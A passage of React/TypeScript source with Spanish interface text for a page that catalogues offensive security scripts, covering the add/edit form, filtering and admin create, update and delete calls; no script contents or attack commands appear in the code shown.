          <div className='absolute top-2 right-2'>
            <CopyBtn text={script.content} />
          </div>
        </div>
      )}
    </div>
  )
}

// ─── Script Form (add/edit custom) ────────────────────────────────────────────
interface ScriptFormProps {
  initial?: Script
  onSave: (data: Partial<Script>) => Promise<void>
  onCancel: () => void
  saving: boolean
}
function ScriptForm({ initial, onSave, onCancel, saving }: ScriptFormProps) {
  const [name, setName]           = useState(initial?.name ?? '')
  const [desc, setDesc]           = useState(initial?.description ?? '')
  const [cat, setCat]             = useState(initial?.category ?? 'General')
  const [platform, setPlatform]   = useState<Platform>(initial?.platform ?? 'linux')
  const [lang, setLang]           = useState<Lang>(initial?.language ?? 'bash')
  const [content, setContent]     = useState(initial?.content ?? '')
  const [severity, setSeverity]   = useState<Severity>(initial?.severity ?? 'info')
  const [stype, setStype]         = useState<ScriptType>(initial?.script_type ?? 'detection')
  const [mitres, setMitres]       = useState((initial?.mitre_ids ?? []).join(', '))
  const [tools, setTools]         = useState((initial?.related_tools ?? []).join(', '))
  const [tags, setTags]           = useState((initial?.tags ?? []).join(', '))
  const [notes, setNotes]         = useState(initial?.notes ?? '')

  const submit = () => onSave({
    name: name.trim(), description: desc.trim(), category: cat,
    platform, language: lang, content: content.trim(),
    severity, script_type: stype,
    mitre_ids: mitres.split(',').map(s => s.trim()).filter(Boolean),
    related_tools: tools.split(',').map(s => s.trim()).filter(Boolean),
    tags: tags.split(',').map(s => s.trim()).filter(Boolean),
    notes: notes.trim() || undefined,
  })

  return (
    <div className='space-y-3 rounded-lg border border-red-900/40 bg-zinc-900/80 p-4'>
      <div className='flex items-center justify-between'>
        <span className='text-xs font-semibold text-zinc-300'>{initial ? 'Editar script' : 'Nuevo script'}</span>
        <button onClick={onCancel}><X className='h-4 w-4 text-zinc-500 hover:text-zinc-300' /></button>
      </div>
      <div className='grid grid-cols-2 gap-2'>
        <div className='col-span-2 space-y-1'>
          <label className='text-[10px] text-zinc-500 uppercase'>Nombre *</label>
          <Input value={name} onChange={e => setName(e.target.value)} placeholder='Ej: EternalBlue Check' className='h-7 text-xs bg-zinc-950 border-zinc-700' />
        </div>
        <div className='space-y-1'>
          <label className='text-[10px] text-zinc-500 uppercase'>Categoría</label>
          <select value={cat} onChange={e => setCat(e.target.value)} className='h-7 w-full rounded-md border border-zinc-700 bg-zinc-950 px-2 text-xs text-zinc-200'>
            {CATEGORIES.map(c => <option key={c} value={c}>{c}</option>)}
          </select>
        </div>
        <div className='space-y-1'>
          <label className='text-[10px] text-zinc-500 uppercase'>Tipo</label>
          <select value={stype} onChange={e => setStype(e.target.value as ScriptType)} className='h-7 w-full rounded-md border border-zinc-700 bg-zinc-950 px-2 text-xs text-zinc-200'>
            {Object.entries(TYPE_LABEL).map(([k, v]) => <option key={k} value={k}>{v}</option>)}
          </select>
        </div>
        <div className='space-y-1'>
          <label className='text-[10px] text-zinc-500 uppercase'>Plataforma</label>
          <select value={platform} onChange={e => setPlatform(e.target.value as Platform)} className='h-7 w-full rounded-md border border-zinc-700 bg-zinc-950 px-2 text-xs text-zinc-200'>
            {Object.entries(PLATFORM_LABEL).map(([k, v]) => <option key={k} value={k}>{v}</option>)}
          </select>
        </div>
        <div className='space-y-1'>
          <label className='text-[10px] text-zinc-500 uppercase'>Lenguaje</label>
          <select value={lang} onChange={e => setLang(e.target.value as Lang)} className='h-7 w-full rounded-md border border-zinc-700 bg-zinc-950 px-2 text-xs text-zinc-200'>
            {Object.entries(LANG_LABEL).map(([k, v]) => <option key={k} value={k}>{v}</option>)}
          </select>
        </div>
        <div className='space-y-1'>
          <label className='text-[10px] text-zinc-500 uppercase'>Severidad</label>
          <select value={severity} onChange={e => setSeverity(e.target.value as Severity)} className='h-7 w-full rounded-md border border-zinc-700 bg-zinc-950 px-2 text-xs text-zinc-200'>
            {Object.entries(SEVERITY_META).map(([k, v]) => <option key={k} value={k}>{v.label}</option>)}
          </select>
        </div>
        <div className='col-span-2 space-y-1'>
          <label className='text-[10px] text-zinc-500 uppercase'>Descripción</label>
          <Textarea value={desc} onChange={e => setDesc(e.target.value)} rows={2} className='text-xs bg-zinc-950 border-zinc-700 resize-none' />
        </div>
        <div className='col-span-2 space-y-1'>
          <label className='text-[10px] text-zinc-500 uppercase'>Contenido del script *</label>
          <Textarea value={content} onChange={e => setContent(e.target.value)} rows={10}
            className='text-xs font-mono bg-zinc-950 border-zinc-700 resize-y' placeholder='#!/bin/bash&#10;...' />
        </div>
        <div className='space-y-1'>
          <label className='text-[10px] text-zinc-500 uppercase'>MITRE IDs (comas)</label>
          <Input value={mitres} onChange={e => setMitres(e.target.value)} placeholder='T1190, T1210' className='h-7 text-xs font-mono bg-zinc-950 border-zinc-700' />
        </div>
        <div className='space-y-1'>
          <label className='text-[10px] text-zinc-500 uppercase'>Arsenal tools (comas)</label>
          <Input value={tools} onChange={e => setTools(e.target.value)} placeholder='nmap, metasploit' className='h-7 text-xs bg-zinc-950 border-zinc-700' />
        </div>
        <div className='space-y-1'>
          <label className='text-[10px] text-zinc-500 uppercase'>Tags</label>
          <Input value={tags} onChange={e => setTags(e.target.value)} placeholder='smb, windows, cve' className='h-7 text-xs bg-zinc-950 border-zinc-700' />
        </div>
        <div className='space-y-1'>
          <label className='text-[10px] text-zinc-500 uppercase'>Notas</label>
          <Input value={notes} onChange={e => setNotes(e.target.value)} placeholder='Requisitos, advertencias...' className='h-7 text-xs bg-zinc-950 border-zinc-700' />
        </div>
      </div>
      <div className='flex gap-2 justify-end'>
        <Button size='sm' variant='ghost' onClick={onCancel} className='h-7 text-xs'>Cancelar</Button>
        <Button size='sm' onClick={submit} disabled={saving || !name.trim() || !content.trim()} className='h-7 text-xs'>
          {saving ? 'Guardando...' : initial ? 'Guardar cambios' : 'Agregar script'}
        </Button>
      </div>
    </div>
  )
}

// ─── Componente principal ─────────────────────────────────────────────────────
export function Scripts() {
  const { auth } = useAuthStore()
  const isAdmin = auth.user?.role === 'admin'

  const [search, setSearch]           = useState('')
  const [filterPlatform, setFPlatform]= useState<Platform | ''>('')
  const [filterLang, setFLang]        = useState<Lang | ''>('')
  const [filterCat, setFCat]          = useState('')
  const [expandedCats, setExpandedCats] = useState<Set<string>>(new Set(CATEGORIES.slice(0, 3)))

  const [customScripts, setCustomScripts]     = useState<Script[]>([])
  const [loadingCustom, setLoadingCustom]     = useState(true)
  const [showForm, setShowForm]               = useState(false)
  const [editScript, setEditScript]           = useState<Script | null>(null)
  const [editScriptIsBuiltin, setEditBuiltin] = useState(false)
  const [formSaving, setFormSaving]           = useState(false)

  // Built-in overrides
  const [scriptOverrides, setScriptOverrides] = useState<Record<string, Partial<Script>>>({})
  const [hiddenScriptIds, setHiddenIds]       = useState<Set<string>>(new Set())

  useEffect(() => {
    Promise.all([
      apiFetch<Script[]>('/scripts'),
      apiFetch<Array<{ item_id: string; hidden: number } & Partial<Script>>>('/scripts/overrides'),
    ])
      .then(([customs, overrides]) => {
        setCustomScripts(customs.map(s => ({ ...s, isCustom: true })))
        const hidden = new Set<string>()
        const ovrs: Record<string, Partial<Script>> = {}
        overrides.forEach(r => {
          if (r.hidden) { hidden.add(r.item_id) }
          else { const { item_id, hidden: _h, ...rest } = r; ovrs[item_id] = { ...rest, isModified: true } }
        })
        setHiddenIds(hidden)
        setScriptOverrides(ovrs)
      })
      .catch(() => {})
      .finally(() => setLoadingCustom(false))
  }, [])

  const allScripts = useMemo<Script[]>(() => {
    const builtins = BUILTIN_SCRIPTS
      .filter(s => !hiddenScriptIds.has(s.id))
      .map(s => scriptOverrides[s.id] ? { ...s, ...scriptOverrides[s.id], isModified: true } : s)
    return [...builtins, ...customScripts]
  }, [customScripts, scriptOverrides, hiddenScriptIds])

  // sidebarList ignores filterCat so all categories stay visible when one is selected
  const sidebarList = useMemo(() => {
    let list = allScripts
    if (filterPlatform) list = list.filter(s => s.platform === filterPlatform || s.platform === 'cross')
    if (filterLang)     list = list.filter(s => s.language === filterLang)
    if (search.trim()) {
      const q = search.toLowerCase()
      list = list.filter(s =>
        s.name.toLowerCase().includes(q) ||
        s.description.toLowerCase().includes(q) ||
        s.tags.some(t => t.includes(q)) ||
        s.mitre_ids.some(m => m.toLowerCase().includes(q)) ||
        s.related_tools.some(t => t.includes(q))
      )
    }
    return list
  }, [allScripts, filterPlatform, filterLang, search])

  const filtered = useMemo(() => {
    if (filterCat) return sidebarList.filter(s => s.category === filterCat)
    return sidebarList
  }, [sidebarList, filterCat])

  const byCategory = useMemo(() =>
    CATEGORIES.map(cat => ({ cat, scripts: filtered.filter(s => s.category === cat) }))
      .filter(g => g.scripts.length > 0 || (isAdmin && filterCat === '' && !search)),
    [filtered, isAdmin, filterCat, search]
  )

  const toggleCat = (cat: string) =>
    setExpandedCats(prev => { const n = new Set(prev); n.has(cat) ? n.delete(cat) : n.add(cat); return n })

  const saveScript = async (data: Partial<Script>) => {
    setFormSaving(true)
    try {
      if (editScript) {
        if (editScriptIsBuiltin) {
          // Built-in: save override
          const updated = await apiFetch<Partial<Script>>(`/scripts/overrides/${editScript.id}`, { method: 'PUT', body: data })
          setScriptOverrides(prev => ({ ...prev, [editScript.id]: { ...updated, isModified: true } }))
        } else {
          // Custom: update in scripts table
          const updated = await apiFetch<Script>(`/scripts/${editScript.id}`, { method: 'PUT', body: data })
          setCustomScripts(prev => prev.map(s => s.id === editScript.id ? { ...updated, isCustom: true } : s))
        }
        setEditScript(null)
        toast.success('Script actualizado')
      } else {
        const created = await apiFetch<Script>('/scripts', { method: 'POST', body: data })
        setCustomScripts(prev => [...prev, { ...created, isCustom: true }])
        setShowForm(false)
        toast.success('Script agregado')
      }
    } catch (e: unknown) { toast.error(e instanceof Error ? e.message : 'Error al guardar') }
    finally { setFormSaving(false) }
  }

  const deleteScript = async (script: Script) => {
    if (!confirm(`¿Eliminar "${script.name}"?`)) return
    try {
      if (script.isCustom) {
        await apiFetch(`/scripts/${script.id}`, { method: 'DELETE' })
        setCustomScripts(prev => prev.filter(s => s.id !== script.id))
      } else {
        await apiFetch(`/scripts/overrides/${script.id}`, { method: 'DELETE' })
        setHiddenIds(prev => new Set([...prev, script.id]))
        setScriptOverrides(prev => { const n = {...prev}; delete n[script.id]; return n })
      }
      if (editScript?.id === script.id) setEditScript(null)
      toast.success('Script eliminado')
    } catch (e: unknown) { toast.error(e instanceof Error ? e.message : 'Error al eliminar') }
  }

  return (
    <div className='flex h-[calc(100vh-4rem)] -m-6 overflow-hidden'>
      {/* ── Sidebar ─────────────────────────────────────────────────── */}
      <div className='flex w-72 shrink-0 flex-col border-r border-zinc-800 overflow-hidden'>
        <div className='border-b border-zinc-800 p-4 space-y-3'>
          <div className='flex items-center gap-2'>
            <FileCode2 className='h-4 w-4 text-red-500' />
            <h1 className='font-semibold text-sm text-zinc-200'>Scripts</h1>
            <span className='ml-auto text-xs text-zinc-500'>{allScripts.length} scripts</span>
          </div>
          <div className='relative'>
            <Search className='absolute left-2.5 top-2.5 h-3.5 w-3.5 text-zinc-500' />
            <Input placeholder='Buscar script...' value={search} onChange={e => setSearch(e.target.value)}
              className='h-8 pl-8 text-xs bg-zinc-950 border-zinc-800' />
          </div>
        </div>

        {/* Filters */}
        <div className='border-b border-zinc-800 px-3 py-2 space-y-2'>
          <div className='flex flex-wrap gap-1'>
            <button onClick={() => setFPlatform('')} className={cn('rounded px-2 py-0.5 text-[10px] transition', filterPlatform === '' ? 'bg-zinc-700 text-zinc-200' : 'text-zinc-500 hover:text-zinc-300')}>Todas</button>
            {(['linux', 'windows', 'cross'] as Platform[]).map(p => (
              <button key={p} onClick={() => setFPlatform(p === filterPlatform ? '' : p)}
                className={cn('rounded border px-2 py-0.5 text-[10px] transition', filterPlatform === p ? 'border-red-800 text-red-400 bg-red-900/20' : 'border-transparent text-zinc-500 hover:text-zinc-300')}>
                {p === 'linux' ? '🐧' : p === 'windows' ? '🪟' : '🔄'} {p}
              </button>
            ))}
          </div>
          <div className='flex flex-wrap gap-1'>
            {(['bash', 'powershell', 'python'] as Lang[]).map(l => (
              <button key={l} onClick={() => setFLang(l === filterLang ? '' : l)}
                className={cn('rounded px-1.5 py-0.5 text-[10px] font-mono transition', filterLang === l ? 'bg-red-900/30 text-red-400' : 'text-zinc-600 hover:text-zinc-300')}>
                {l}
              </button>
            ))}
          </div>
        </div>

        {/* Category tree */}
        <div className='flex-1 overflow-y-auto py-2'>
          <button onClick={() => setFCat('')}
            className={cn('flex w-full items-center gap-2 rounded-md px-3 py-1.5 text-xs mx-1 transition mb-1',
              filterCat === '' ? 'bg-zinc-800 text-zinc-100' : 'text-zinc-400 hover:bg-zinc-900 hover:text-zinc-200')}>
            <span className='flex-1 text-left font-medium'>Todos los scripts</span>
            <span className='rounded bg-zinc-700 px-1.5 py-0.5 text-[10px] text-zinc-400'>{sidebarList.length}</span>
          </button>
          {CATEGORIES.map(cat => {
            const count = sidebarList.filter(s => s.category === cat).length
            if (count === 0) return null
            return (
              <div key={cat}>
                <button onClick={() => { setFCat(cat === filterCat ? '' : cat); toggleCat(cat) }}
                  className={cn('flex w-full items-center gap-1.5 px-3 py-1.5 text-[10px] font-semibold uppercase tracking-wide transition',
                    filterCat === cat ? 'text-red-400' : 'text-zinc-500 hover:text-zinc-300')}>
                  {expandedCats.has(cat) ? <ChevronDown className='h-3 w-3 shrink-0' /> : <ChevronRight className='h-3 w-3 shrink-0' />}
                  <span className='flex-1 text-left truncate'>{cat}</span>
                  <span className='text-zinc-700'>{count}</span>
                </button>
              </div>
            )
          })}
        </div>

        {/* Admin: add script */}
        {isAdmin && (
          <div className='border-t border-zinc-800 p-3'>
            <Button size='sm' className='w-full h-7 text-xs' variant='outline'
              onClick={() => { setShowForm(true); setEditScript(null) }}>
              <Plus className='h-3 w-3 mr-1' /> Agregar script custom
            </Button>
          </div>
        )}
      </div>

      {/* ── Right panel ─────────────────────────────────────────────── */}
      <div className='flex-1 overflow-y-auto'>
        <div className='sticky top-0 z-10 border-b border-zinc-800 bg-zinc-950/95 px-6 py-4 backdrop-blur'>
          <div className='flex items-center gap-3'>
            <div>
              <h2 className='font-semibold text-zinc-100'>{filterCat || 'Scripts de seguridad ofensiva'}</h2>
              <p className='text-xs text-zinc-500'>
                {filtered.length} script{filtered.length !== 1 ? 's' : ''}
                {filterPlatform && ` · ${PLATFORM_LABEL[filterPlatform]}`}
                {filterLang && ` · ${LANG_LABEL[filterLang]}`}
                {search && ` para "${search}"`}
              </p>
            </div>
            <div className='ml-auto flex items-center gap-2'>
              <div className='flex items-center gap-1 text-[10px] text-zinc-600'>
                <Shield className='h-3 w-3' /> Solo usar con autorización explícita
              </div>
            </div>
          </div>
        </div>

        <div className='p-6 space-y-8'>
          {/* Add/Edit form */}
          {isAdmin && (showForm || editScript) && (
            <ScriptForm initial={editScript ?? undefined} saving={formSaving}
              onCancel={() => { setShowForm(false); setEditScript(null) }}
              onSave={saveScript} />
          )}

          {filtered.length === 0 && !showForm ? (
            <div className='flex flex-col items-center justify-center py-24 text-center'>
              <AlertTriangle className='mb-3 h-8 w-8 text-zinc-700' />
              <p className='text-sm text-zinc-500'>No se encontraron scripts</p>
            </div>
          ) : filterCat ? (
            <div className='space-y-4'>
              {filtered.map(s => (
                <ScriptCard key={s.id} script={s}
                  onEdit={isAdmin ? () => { setEditScript(s); setEditBuiltin(!s.isCustom); setShowForm(false) } : undefined}
                  onDelete={isAdmin ? () => deleteScript(s) : undefined} />
              ))}
            </div>
          ) : (
            byCategory.map(({ cat, scripts }) => scripts.length > 0 && (
              <div key={cat}>
                <h3 className='mb-3 text-xs font-semibold uppercase tracking-wider text-zinc-600 border-b border-zinc-800 pb-2'>{cat}</h3>
                <div className='space-y-3'>
                  {scripts.map(s => (
                    <ScriptCard key={s.id} script={s}
                      onEdit={isAdmin ? () => { setEditScript(s); setEditBuiltin(!s.isCustom); setShowForm(false) } : undefined}
                      onDelete={isAdmin ? () => deleteScript(s) : undefined} />
                  ))}
                </div>
              </div>
            ))
          )}
        </div>
      </div>
    </div>
  )
}
